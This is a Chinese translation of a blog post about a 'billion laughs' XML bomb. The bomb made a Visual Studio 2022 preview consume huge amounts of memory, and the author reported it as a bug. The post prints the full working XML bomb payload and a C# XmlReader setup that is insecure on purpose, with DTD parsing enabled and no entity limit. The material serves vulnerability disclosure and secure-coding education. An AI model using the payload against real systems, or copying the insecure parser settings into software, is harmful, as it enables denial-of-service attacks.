<html>
<head>
<title>How Visual Studio 2022 ate up 100 GB of memory and what XML bombs had to do with it</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">Visual Studio 2022如何耗尽100 GB内存，以及XML炸弹与此有什么关系</h1>
<blockquote>原文：<a href="https://itnext.io/how-visual-studio-2022-ate-up-100-gb-of-memory-and-what-xml-bombs-had-to-do-with-it-3a92ed11c6cb?source=collection_archive---------1-----------------------#2021-09-07">https://itnext.io/how-visual-studio-2022-ate-up-100-gb-of-memory-and-what-xml-bombs-had-to-do-with-it-3a92ed11c6cb?source=collection_archive---------1-----------------------#2021-09-07</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div class="gh gi jn"><img src="../Images/d7dbf6dbddd8cea26b4ab1b24a386256.png" data-original-src="https://miro.medium.com/v2/resize:fit:928/format:webp/0*3KAQcWI8nd_VZjAK.png"/></div></figure><p id="2f8d" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">2021年4月，微软宣布了其IDE的新版本——Visual Studio 2022——同时还宣布该IDE将是64位的。我们等待这一刻已经很久了——再也没有4 GB内存限制了！然而，事实证明，事情并不那么简单…</p><p id="3a35" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">对了，如果你错过了，这里有一个<a class="ae ks" href="https://devblogs.microsoft.com/visualstudio/visual-studio-2022/" rel="noopener ugc nofollow" target="_blank">公告贴</a>的链接。</p><p id="27a6" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">但是让我们来讨论这个问题。我在最新(撰写本文时可用)的Visual Studio 2022版本— 17.0.0预览版3.1上重现了这个问题。</p><p id="735e" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">要重现这一点，以下内容就足够了:</p><ul class=""><li id="a52d" class="kt ku iq jw b jx jy kb kc kf kv kj kw kn kx kr ky kz la lb bi translated">使用空白解决方案模板创建新项目；</li><li id="717b" class="kt ku iq jw b jx lc kb ld kf le kj lf kn lg kr ky kz la lb bi translated">将XML文件添加到解决方案中。</li></ul><p id="f24e" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">之后，尝试将以下文本复制到XML文件中:</p><pre class="lh li lj lk gt ll lm ln lo aw lp bi"><span id="5510" class="lq lr iq lm b gy ls lt l lu lv">&lt;?xml version="1.0"?&gt;<br/>&lt;!DOCTYPE lolz [<br/> &lt;!ENTITY lol "lol"&gt;<br/> &lt;!ELEMENT lolz (#PCDATA)&gt;<br/> &lt;!ENTITY lol1 "&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;"&gt;<br/> &lt;!ENTITY lol2 "&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;"&gt;<br/> &lt;!ENTITY lol3 "&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;"&gt;<br/> &lt;!ENTITY lol4 "&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;"&gt;<br/> &lt;!ENTITY lol5 "&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;"&gt;<br/> &lt;!ENTITY lol6 "&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;"&gt;<br/> &lt;!ENTITY lol7 "&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;"&gt;<br/> &lt;!ENTITY lol8 "&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;"&gt;<br/> &lt;!ENTITY lol9 "&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;"&gt;<br/> &lt;!ENTITY lol10 "&amp;lol9;&amp;lol9;&amp;lol9;&amp;lol9;&amp;lol9;&amp;lol9;&amp;lol9;&amp;lol9;&amp;lol9;&amp;lol9;"&gt;<br/> &lt;!ENTITY lol11 <br/>  "&amp;lol10;&amp;lol10;&amp;lol10;&amp;lol10;&amp;lol10;&amp;lol10;&amp;lol10;&amp;lol10;<br/>   &amp;lol10;&amp;lol10;"&gt;<br/> &lt;!ENTITY lol12 <br/>   "&amp;lol11;&amp;lol11;&amp;lol11;&amp;lol11;&amp;lol11;&amp;lol11;&amp;lol11;&amp;lol11;<br/>    &amp;lol11;&amp;lol11;"&gt;<br/> &lt;!ENTITY lol13 <br/>   "&amp;lol12;&amp;lol12;&amp;lol12;&amp;lol12;&amp;lol12;&amp;lol12;&amp;lol12;&amp;lol12;<br/>    &amp;lol12;&amp;lol12;"&gt;<br/> &lt;!ENTITY lol14 <br/>   "&amp;lol13;&amp;lol13;&amp;lol13;&amp;lol13;&amp;lol13;&amp;lol13;&amp;lol13;&amp;lol13;<br/>    &amp;lol13;&amp;lol13;"&gt;<br/> &lt;!ENTITY lol15 <br/>   "&amp;lol14;&amp;lol14;&amp;lol14;&amp;lol14;&amp;lol14;&amp;lol14;&amp;lol14;&amp;lol14;<br/>    &amp;lol14;&amp;lol14;"&gt;<br/>]&gt;<br/>&lt;lolz&gt;&amp;lol15;&lt;/lolz&gt;</span></pre><p id="0fc4" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">现在去给自己冲一杯咖啡，回到你的电脑前——看着Visual Studio吃掉越来越多的RAM。</p><figure class="lh li lj lk gt jr gh gi paragraph-image"><div class="gh gi lw"><img src="../Images/2fabeddce8d67849140ca69f041fe597.png" data-original-src="https://miro.medium.com/v2/resize:fit:1140/format:webp/0*AjB29RdCa2ojY6yP.png"/></div></figure><p id="5651" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">你可能有两个问题:</p><ul class=""><li id="e6ca" class="kt ku iq jw b jx jy kb kc kf kv kj kw kn kx kr ky kz la lb bi translated">为什么要创建一些奇怪的XML并将其添加到项目中呢？</li><li id="8ed9" class="kt ku iq jw b jx lc kb ld kf le kj lf kn lg kr ky kz la lb bi translated">这里发生了什么事？</li></ul><p id="0369" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">让我们来解决这个问题。要做到这一点，我们需要理解为什么不小心处理XML文件是危险的，以及PVS-Studio analyzer与这一切有什么关系。</p><h1 id="f1e8" class="lx lr iq bd ly lz ma mb mc md me mf mg mh mi mj mk ml mm mn mo mp mq mr ms mt bi translated">SAST在PVS工作室</h1><p id="81d2" class="pw-post-body-paragraph ju jv iq jw b jx mu jz ka kb mv kd ke kf mw kh ki kj mx kl km kn my kp kq kr ij bi translated">我们继续积极开发PVS-Studio作为SAST解决方案。如果我们谈论C#分析器，这里的主要焦点是<a class="ae ks" href="https://pvs-studio.com/en/pvs-studio/sast/owasptopten/" rel="noopener ugc nofollow" target="_blank">OWASP 2017年前10名</a>(这是可用的最新版本——我们期待更新！)支持。顺便说一下，如果你错过了，不久前我们增加了污点分析功能。你可以在这里阅读<a class="ae ks" href="https://pvs-studio.com/en/blog/posts/csharp/0831/" rel="noopener ugc nofollow" target="_blank"/>。</p><p id="c87c" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">因此，我创建了(或者确切地说，试图创建)一个示例项目来测试分析器。事实是，我们正在为其开发诊断规则的OWASP十大类别之一是<a class="ae ks" href="https://owasp.org/www-project-top-ten/2017/A4_2017-XML_External_Entities_(XXE)" rel="noopener ugc nofollow" target="_blank"> A4:2017-XML外部实体(XXE) </a>。它与不正确的XML文件处理有关，这使得应用程序容易受到攻击。不正确的处理是什么意思？通常是对输入数据的过度信任(一个导致许多漏洞的永恒问题)与缺乏足够限制的XML解析器相结合。</p><p id="d85c" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">因此，如果文件遭到破坏，这可能会导致各种令人不快的后果。这里主要有两个问题:数据泄露和拒绝服务。两者都有相应的cwe:</p><ul class=""><li id="f09b" class="kt ku iq jw b jx jy kb kc kf kv kj kw kn kx kr ky kz la lb bi translated"><a class="ae ks" href="https://cwe.mitre.org/data/definitions/611.html" rel="noopener ugc nofollow" target="_blank"> CWE-611:对XML外部实体引用的不当限制</a></li><li id="2350" class="kt ku iq jw b jx lc kb ld kf le kj lf kn lg kr ky kz la lb bi translated"><a class="ae ks" href="https://cwe.mitre.org/data/definitions/776.html" rel="noopener ugc nofollow" target="_blank">CWE-776:dtd中递归实体引用的不当限制(XML实体扩展’)</a></li></ul><p id="2a2f" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">前几天我会离开CWE-611。今天我们需要CWE-776。</p><h1 id="f39f" class="lx lr iq bd ly lz ma mb mc md me mf mg mh mi mj mk ml mm mn mo mp mq mr ms mt bi translated">XML炸弹(十亿次大笑攻击)</h1><p id="0eb8" class="pw-post-body-paragraph ju jv iq jw b jx mu jz ka kb mv kd ke kf mw kh ki kj mx kl km kn my kp kq kr ij bi translated">我简单描述一下问题的本质。如果你想知道更多，因特网上的许多资源会给你提供你所需要的信息。</p><p id="84a5" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">XML标准假设使用<a class="ae ks" href="https://en.wikipedia.org/wiki/Document_type_definition" rel="noopener ugc nofollow" target="_blank"> DTD </a>(文档类型定义)。DTD使您能够使用所谓的XML实体。</p><p id="d696" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">实体语法很简单:</p><pre class="lh li lj lk gt ll lm ln lo aw lp bi"><span id="3c88" class="lq lr iq lm b gy ls lt l lu lv">&lt;!ENTITY myEntity "Entity value"&gt;</span></pre><p id="f6e6" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">然后，您可以按如下方式获得实体值:</p><pre class="lh li lj lk gt ll lm ln lo aw lp bi"><span id="1b26" class="lq lr iq lm b gy ls lt l lu lv">&amp;myEntity;</span></pre><p id="e63a" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">这里的问题是，实体不仅可以扩展成字符串(在我们的例子中是“实体值”)，还可以扩展成其他实体的序列。例如:</p><pre class="lh li lj lk gt ll lm ln lo aw lp bi"><span id="c2ea" class="lq lr iq lm b gy ls lt l lu lv">&lt;!ENTITY lol "lol"&gt;<br/>&lt;!ENTITY lol1 "&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;"&gt;</span></pre><p id="aa29" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">因此，当扩展“lol1”实体时，我们会得到如下所示的字符串:</p><pre class="lh li lj lk gt ll lm ln lo aw lp bi"><span id="dbd7" class="lq lr iq lm b gy ls lt l lu lv">lollollollollollollollollollol</span></pre><p id="a14d" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">您可以更进一步，通过“lol1”扩展“lol2”实体来定义它:</p><pre class="lh li lj lk gt ll lm ln lo aw lp bi"><span id="5130" class="lq lr iq lm b gy ls lt l lu lv">&lt;!ENTITY lol2 "&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;"&gt;</span></pre><p id="99f8" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">然后，当扩展“lol2”实体时，您会得到以下输出:</p><pre class="lh li lj lk gt ll lm ln lo aw lp bi"><span id="5323" class="lq lr iq lm b gy ls lt l lu lv">lollollollollollollollollollollollollollollollollollollollollollol<br/>lollollollollollollollollollollollollollollollollollollollollollol<br/>lollollollollollollollollollollollollollollollollollollollollollol<br/>lollollollollollollollollollollollollollollollollollollollollollol<br/>lollollollollollollollollollollollol</span></pre><p id="c06a" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">再深入一层定义‘lol 3’实体怎么样？</p><pre class="lh li lj lk gt ll lm ln lo aw lp bi"><span id="f908" class="lq lr iq lm b gy ls lt l lu lv">&lt;!ENTITY lol3 "&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;"&gt;</span></pre><p id="92bc" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">这是展开时得到的输出:</p><pre class="lh li lj lk gt ll lm ln lo aw lp bi"><span id="33f3" class="lq lr iq lm b gy ls lt l lu lv">lollollollollollollollollollollollollollollollollollollollollollol<br/>lollollollollollollollollollollollollollollollollollollollollollol<br/>lollollollollollollollollollollollollollollollollollollollollollol<br/>lollollollollollollollollollollollollollollollollollollollollollol<br/>lollollollollollollollollollollollollollollollollollollollollollol<br/>lollollollollollollollollollollollollollollollollollollollollollol<br/>lollollollollollollollollollollollollollollollollollollollollollol<br/>lollollollollollollollollollollollollollollollollollollollollollol<br/>lollollollollollollollollollollollollollollollollollollollollollol<br/>lollollollollollollollollollollollollollollollollollollollollollol<br/>lollollollollollollollollollollollollollollollollollollollollollol<br/>lollollollollollollollollollollollollollollollollollollollollollol<br/>lollollollollollollollollollollollollollollollollollollollollollol<br/>lollollollollollollollollollollollollollollollollollollollollollol<br/>lollollollollollollollollollollollollollollollollollollollollollol<br/>lollollollollollollollollollollollollollollollollollollollollollol<br/>lollollollollollollollollollollollollollollollollollollollollollol<br/>lollollollollollollollollollollollollollollollollollollollollollol<br/>lollollollollollollollollollollollol<br/>....</span></pre><p id="813b" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我们在本文开头使用的XML文件也是用同样的原理生成的。现在，我想你明白“十亿次大笑”这个名字的由来了。因此，事实证明，如果XML解析器配置不正确(启用了DTD处理，并且没有限制最大实体大小)，那么在处理这个“炸弹”时不会有什么好结果。</p><p id="483a" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">谈到C#，易受攻击的代码最容易用一个<em class="mz"> XmlReader </em>类型的例子来演示:</p><pre class="lh li lj lk gt ll lm ln lo aw lp bi"><span id="94f1" class="lq lr iq lm b gy ls lt l lu lv">var pathToXmlBomb = @"D:\XMLBomb.xml";<br/>XmlReaderSettings rs = <strong class="lm ir">new</strong> XmlReaderSettings()<br/>{<br/>  DtdProcessing = DtdProcessing.Parse,<br/>  MaxCharactersFromEntities = 0<br/>};</span><span id="6532" class="lq lr iq lm b gy na lt l lu lv"><strong class="lm ir">using</strong> var reader <br/>  = XmlReader.Create(File.OpenRead(pathToXmlBomb), rs);<br/><strong class="lm ir">while</strong> (reader.Read())<br/>{<br/>  <strong class="lm ir">if</strong> (reader.NodeType == XmlNodeType.Text)<br/>    Console.WriteLine(reader.Value);<br/>}</span></pre><p id="619b" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">如果我这样配置我的<em class="mz"> XmlReader </em>，我几乎是在告诉入侵者:“来吧，把它炸掉！”。</p><p id="f150" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">这有两个原因:</p><ul class=""><li id="fead" class="kt ku iq jw b jx jy kb kc kf kv kj kw kn kx kr ky kz la lb bi translated">DTD处理已启用；</li><li id="5708" class="kt ku iq jw b jx lc kb ld kf le kj lf kn lg kr ky kz la lb bi translated">实体的最大字符数限制已经取消，文件可以不受阻碍地增长。</li></ul><p id="1229" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">默认情况下，禁止处理DTD实体:<em class="mz"> DtdProcessing </em>属性设置为<em class="mz">禁止</em>。实体的最大字符数也受到限制(从。NET框架4.5.2)。所以在现代。你搬起石头砸自己的脚的机会越来越少了。但是这仍然是可能的——如果您没有正确配置解析器的话。</p><h1 id="4ed5" class="lx lr iq bd ly lz ma mb mc md me mf mg mh mi mj mk ml mm mn mo mp mq mr ms mt bi translated">回到Visual Studio 2022</h1><p id="42e5" class="pw-post-body-paragraph ju jv iq jw b jx mu jz ka kb mv kd ke kf mw kh ki kj mx kl km kn my kp kq kr ij bi translated">似乎在Visual Studio 2022中，当我们复制我们的XML炸弹时，两个条件都为真:</p><ul class=""><li id="401e" class="kt ku iq jw b jx jy kb kc kf kv kj kw kn kx kr ky kz la lb bi translated">DTD处理已开始；</li><li id="9506" class="kt ku iq jw b jx lc kb ld kf le kj lf kn lg kr ky kz la lb bi translated">没有设置限制—这导致了不断增加的内存消耗。</li></ul><p id="d7b8" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我们检查了这个过程，看看发生了什么。我们的发现证实了我们的期望。</p><figure class="lh li lj lk gt jr gh gi paragraph-image"><div class="gh gi nb"><img src="../Images/4431e2150669efc57e2f0ef70c691f6e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1040/format:webp/0*4zAIM7Y6tetnDBg6.png"/></div></figure><p id="35db" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">进程列表显示主线程正在处理XML文件。这导致GUI冻结，IDE没有响应任何恢复它的尝试。使用XML文件。</p><p id="20b9" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">VS主线程的调用堆栈显示该线程正忙于处理DTD(<em class="mz">parsed TD</em>方法执行)</p><figure class="lh li lj lk gt jr gh gi paragraph-image"><div class="gh gi nc"><img src="../Images/a9c3c842e0248961d93e18b9bb40cce5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1068/format:webp/0*mje2FQ48xSvxy3Pe.png"/></div></figure><p id="0dce" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">在实验过程中，我一直在想，为什么Visual Studio要运行DTD处理？为什么它不按原样显示XML？我在试验一个小型XML炸弹时得到了答案(同样的方法，更轻的负载)。</p><p id="9075" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">似乎整个要点是“动态地”在编辑器中显示实体的可能值。</p><figure class="lh li lj lk gt jr gh gi paragraph-image"><div class="gh gi nd"><img src="../Images/c767da7024e87415cee56af9bbe9bffa.png" data-original-src="https://miro.medium.com/v2/resize:fit:942/format:webp/0*-JCrdcgQnruHlqvM.png"/></div></figure><p id="f847" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">小值处理成功，但是当XML实体开始增长时，问题就出现了。</p><p id="078a" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">当然，在我调查之后，我不得不写一份<a class="ae ks" href="https://developercommunity.visualstudio.com/t/Visual-Studio-2022-Preview-is-vulnurable/1521704" rel="noopener ugc nofollow" target="_blank"> bug报告</a>。</p><h1 id="3a69" class="lx lr iq bd ly lz ma mb mc md me mf mg mh mi mj mk ml mm mn mo mp mq mr ms mt bi translated">结论</h1><p id="d8a4" class="pw-post-body-paragraph ju jv iq jw b jx mu jz ka kb mv kd ke kf mw kh ki kj mx kl km kn my kp kq kr ij bi translated">这就是我们如何意外地看到XML炸弹在起作用。探索现实生活中流行的应用程序并找到类似这样的东西非常有趣。</p><p id="49c2" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">就在我写这篇文章的时候，我们正在开发一个诊断工具，用于搜索容易出现XML文件处理问题的代码。我们预计在PVS-Studio 7.15中发布。如果你想看看这个分析器现在能做什么，我鼓励你<a class="ae ks" href="https://pvs-studio.com/en/pvs-studio/download/" rel="noopener ugc nofollow" target="_blank">下载</a>它并在你的项目中试用。；)</p></div></div>    
</body>
</html>